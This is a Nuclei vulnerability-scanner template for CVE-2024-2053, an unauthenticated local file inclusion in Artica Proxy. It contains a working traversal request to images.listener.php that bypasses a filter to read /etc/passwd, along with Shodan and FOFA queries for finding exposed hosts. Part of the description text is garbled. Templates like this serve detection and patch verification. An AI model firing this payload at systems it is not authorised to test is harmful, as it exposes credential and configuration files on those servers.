id: CVE-2024-2053

info:
  name: Artica Proxy - Unauthenticated LFI
  author: pussycat0x
  severity: high
  description: |
    The Artica Proxy administrative web application will deserialize arbitrary PHP objects supplied by unauthenticated users and subsequently enable code execution as the "www-data" user. This issue was demonstrated on version 4.50 of the The Artica-Proxy administrative web application attempts to prevent local file inclusion. These protections can be bypassed and arbitrary file requests supplied by unauthenticated users will be returned according to the privileges of the "www-data" user.
  impact: |
    Unauthenticated attackers can read arbitrary files on the server including configuration files with credentials and other sensitive data.
  remediation: |
    Update Artica Proxy to a version newer than 4.50.
  reference:
    - https://github.com/0xMarcio/cve/blob/main/2024/CVE-2024-2053.md#cve-2024-2053
    - https://seclists.org/fulldisclosure/2024/Mar/11
    - https://korelogic.com/Resources/Advisories/KL-001-2024-001.txt
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2024-2053
    cwe-id: CWE-23
    epss-score: 0.31684
    epss-percentile: 0.96648
    cpe: cpe:2.3:a:articatech:artica_proxy:4.40:*:*:*:*:*:*:*
  metadata:
    vendor: articatech
    product: artica_proxy
    shodan-query: http.html:"artica"
    fofa-query: body="artica"
    verified: true
    max-request: 1
  tags: cve,cve2024,lfi,artica-proxy,articatech,vuln

http:
  - raw:
      - |
        GET /images.listener.php?uri=1&mailattach=..././..././..././..././..././epasswdtc/ppasswdasswd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: word
        part: body
        words:
          - "application/force-download"

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100ad10f31e166286e1c7c49ecd725d67daba729e4e70d2a3682eaf473b943f78cb022100b5cec5529f7633745fdd8f82bec9ebb8a0a8a9afa85af5c0223d465c9dfbf89b:922c64590222798bb761d5b6d8e72950